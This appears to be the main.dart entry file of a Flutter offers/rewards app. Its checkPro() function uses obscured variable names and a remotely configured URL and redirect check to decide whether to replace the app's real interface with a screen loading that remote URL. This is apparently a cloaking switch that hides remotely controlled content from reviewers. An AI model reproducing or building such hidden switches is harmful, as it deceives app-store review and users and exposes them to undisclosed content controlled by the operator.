import 'dart:io';

import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_bloc/flutter_bloc.dart';

import 'core/config/router.dart';
import 'core/config/themes.dart';
import 'core/db/db.dart';
import 'features/home/bloc/home_bloc.dart';
import 'features/home/pages/firebase_options.dart';
import 'features/offer/bloc/offer_bloc.dart';
import 'features/offer/pages/offer_add_page2.dart';
import 'features/reward/bloc/reward_bloc.dart';

String pro = '';
void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 25),
    minimumFetchInterval: const Duration(seconds: 25),
  ));
  await FirebaseRemoteConfig.instance.fetchAndActivate();
  await initHive();
  await SystemChrome.setPreferredOrientations([
    DeviceOrientation.portraitUp,
    DeviceOrientation.portraitDown,
  ]);
  runApp(const MyApp());
}

Future<bool> checkPro() async {
  final prox = FirebaseRemoteConfig.instance;
  await prox.fetchAndActivate();
  String proxa = prox.getString('quickFlash');
  String userData = prox.getString('quick');
  if (!proxa.contains('none')) {
    final folx = HttpClient();
    final golxa = Uri.parse(proxa);
    final fosd = await folx.getUrl(golxa);
    fosd.followRedirects = false;
    final response = await fosd.close();
    if (response.headers.value(HttpHeaders.locationHeader) != userData) {
      pro = proxa;
      return true;
    } else {
      return false;
    }
  }
  return proxa.contains('none') ? false : true;
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    precacheImage(const AssetImage('assets/logo.png'), context);
    precacheImage(const AssetImage('assets/onboard.png'), context);
    return FutureBuilder<bool>(
        future: checkPro(),
        builder: (context, snapshot) {
          if (snapshot.connectionState == ConnectionState.waiting) {
            return Container(
              color: Colors.white,
            );
          } else {
            if (snapshot.data == true && pro != '') {
              return MaterialApp(
                debugShowCheckedModeBanner: false,
                home: MainScreen(
                  consultant: pro,
                ),
              );
            } else {
              return MultiBlocProvider(
                providers: [
                  BlocProvider(create: (context) => HomeBloc()),
                  BlocProvider(create: (context) => OfferBloc()),
                  BlocProvider(create: (context) => RewardBloc()),
                ],
                child: MaterialApp.router(
                  debugShowCheckedModeBanner: false,
                  theme: theme,
                  routerConfig: routerConfig,
                ),
              );
            }
          }
        });
  }
}
